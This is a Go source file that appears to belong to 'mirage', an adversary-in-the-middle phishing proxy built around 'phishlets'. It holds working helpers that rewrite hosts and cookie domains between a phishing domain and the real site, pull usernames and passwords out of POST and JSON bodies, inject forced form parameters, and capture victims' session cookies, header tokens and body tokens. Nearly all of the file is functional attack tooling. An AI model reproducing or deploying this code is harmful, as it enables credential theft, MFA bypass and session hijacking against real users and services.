package proxy

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"

	"github.com/travisbale/mirage/internal/aitm"
)

func hostWithoutPort(hostport string) string {
	if host, _, err := net.SplitHostPort(hostport); err == nil {
		return host
	}
	return hostport
}

func extractClientIP(r *http.Request, trustedCIDRs []*net.IPNet) string {
	socketIP := extractSocketIP(r.RemoteAddr)
	if isTrustedProxy(socketIP, trustedCIDRs) {
		if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
			return firstIP(xff)
		}
		if tci := r.Header.Get("True-Client-IP"); tci != "" {
			return tci
		}
	}
	return socketIP
}

func extractSocketIP(remoteAddr string) string {
	host, _, err := net.SplitHostPort(remoteAddr)
	if err != nil {
		return remoteAddr
	}
	return host
}

func isTrustedProxy(ip string, cidrs []*net.IPNet) bool {
	parsed := net.ParseIP(ip)
	if parsed == nil {
		return false
	}
	for _, cidr := range cidrs {
		if cidr.Contains(parsed) {
			return true
		}
	}
	return false
}

func firstIP(xff string) string {
	parts := strings.SplitN(xff, ",", 2)
	return strings.TrimSpace(parts[0])
}

func rewriteHeader(req *http.Request, header string, p *aitm.Phishlet) {
	parsed, err := url.Parse(req.Header.Get(header))
	if err != nil {
		return
	}
	host := parsed.Hostname()

	for _, ph := range p.ProxyHosts {
		phishHost := ph.PhishHost(p.BaseDomain)
		if strings.EqualFold(host, phishHost) {
			parsed.Scheme = ph.UpstreamScheme
			parsed.Host = ph.OriginHost()
			req.Header.Set(header, parsed.String())
			return
		}
	}
}

func stripCookie(req *http.Request, name string) {
	cookies := req.Cookies()
	req.Header.Del("Cookie")
	for _, cookie := range cookies {
		if cookie.Name != name {
			req.AddCookie(cookie)
		}
	}
}

// readRequestBody reads the request body and replaces it so it can be read again.
func readRequestBody(req *http.Request) ([]byte, error) {
	if req.Body == nil {
		return nil, nil
	}
	b, err := io.ReadAll(req.Body)
	req.Body.Close()
	req.Body = io.NopCloser(bytes.NewReader(b))
	return b, err
}

func readResponseBody(resp *http.Response) ([]byte, error) {
	if resp.Body == nil {
		return nil, nil
	}
	bodyBytes, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		return nil, fmt.Errorf("reading response body: %w", err)
	}
	return bodyBytes, nil
}

func replaceResponseBody(resp *http.Response, bodyBytes []byte) {
	resp.Body = io.NopCloser(bytes.NewReader(bodyBytes))
	resp.ContentLength = int64(len(bodyBytes))
}

func isHTMLResponse(resp *http.Response) bool {
	return strings.HasPrefix(resp.Header.Get("Content-Type"), "text/html")
}

var mutableMIMEPrefixes = []string{
	"text/html", "text/css", "text/javascript",
	"application/javascript", "application/json",
	"application/x-javascript", "image/svg+xml",
}

func isMutableMIME(contentType string) bool {
	for _, prefix := range mutableMIMEPrefixes {
		if strings.HasPrefix(contentType, prefix) {
			return true
		}
	}
	return false
}

func autoFilterReplacer(p *aitm.Phishlet) *strings.Replacer {
	var pairs []string
	for _, ph := range p.ProxyHosts {
		if !ph.AutoFilter {
			continue
		}
		origin := ph.OriginHost()
		phish := ph.PhishHost(p.BaseDomain)
		pairs = append(pairs, ph.UpstreamScheme+"://"+origin, "https://"+phish, origin, phish)
	}
	if len(pairs) == 0 {
		return nil
	}
	return strings.NewReplacer(pairs...)
}

func rewriteCookieDomain(upstreamDomain string, p *aitm.Phishlet) string {
	cleanDomain := strings.TrimPrefix(strings.ToLower(upstreamDomain), ".")
	for _, proxyHost := range p.ProxyHosts {
		if strings.HasSuffix(cleanDomain, strings.ToLower(proxyHost.Domain)) {
			return proxyHost.PhishHost(p.BaseDomain)
		}
	}
	return upstreamDomain
}

func extractField(rule aitm.CredentialRule, body []byte) string {
	switch rule.Type {
	case "post":
		parsed, err := url.ParseQuery(string(body))
		if err != nil {
			return ""
		}
		for key, values := range parsed {
			if rule.Key != nil && rule.Key.MatchString(key) {
				for _, value := range values {
					if rule.Search == nil {
						return value
					}
					if matches := rule.Search.FindStringSubmatch(value); len(matches) > 1 {
						return matches[1]
					}
				}
			}
		}
	case "json":
		if rule.Key != nil && rule.Search != nil {
			if matches := rule.Search.FindSubmatch(body); len(matches) > 1 {
				return string(matches[1])
			}
		}
	}
	return ""
}

func checkForcePostConditions(conditions []aitm.ForcePostCondition, body []byte) bool {
	parsed, _ := url.ParseQuery(string(body))
	for _, condition := range conditions {
		matched := false
		for key, values := range parsed {
			if condition.Key != nil && condition.Key.MatchString(key) {
				for _, value := range values {
					if condition.Search == nil || condition.Search.MatchString(value) {
						matched = true
					}
				}
			}
		}
		if !matched {
			return false
		}
	}
	return true
}

func injectFormParams(body []byte, params []aitm.ForcePostParam) []byte {
	parsed, err := url.ParseQuery(string(body))
	if err != nil {
		parsed = url.Values{}
	}
	for _, param := range params {
		parsed.Set(param.Key, param.Value)
	}
	return []byte(parsed.Encode())
}

func extractCookieToken(session *aitm.Session, cookies []*http.Cookie, rule aitm.TokenRule) bool {
	updated := false
	for _, cookie := range cookies {
		if rule.Name != nil && !rule.Name.MatchString(cookie.Name) {
			continue
		}
		if rule.Domain != "" && !aitm.MatchesDomain(cookie.Domain, rule.Domain) {
			continue
		}
		token := &aitm.CookieToken{
			Name:     cookie.Name,
			Value:    cookie.Value,
			Path:     cookie.Path,
			Domain:   cookie.Domain,
			Expires:  cookie.Expires,
			HttpOnly: cookie.HttpOnly,
			Secure:   cookie.Secure,
		}
		session.AddCookieToken(cookie.Domain, cookie.Name, token)
		updated = true
	}
	return updated
}

func extractHeaderToken(session *aitm.Session, resp *http.Response, rule aitm.TokenRule) bool {
	if rule.Name == nil {
		return false
	}
	for headerName, values := range resp.Header {
		if !rule.Name.MatchString(headerName) {
			continue
		}
		for _, value := range values {
			captured := value
			if rule.Search != nil {
				if matches := rule.Search.FindStringSubmatch(value); len(matches) > 1 {
					captured = matches[1]
				} else {
					continue
				}
			}
			if session.HTTPTokens == nil {
				session.HTTPTokens = make(map[string]string)
			}
			session.HTTPTokens[headerName] = captured
			return true
		}
	}
	return false
}

func extractBodyToken(session *aitm.Session, body []byte, rule aitm.TokenRule) bool {
	if rule.Search == nil || len(body) == 0 {
		return false
	}
	matches := rule.Search.FindSubmatch(body)
	if len(matches) < 2 {
		return false
	}
	if session.BodyTokens == nil {
		session.BodyTokens = make(map[string]string)
	}
	session.BodyTokens[rule.Name.String()] = string(matches[1])
	return true
}
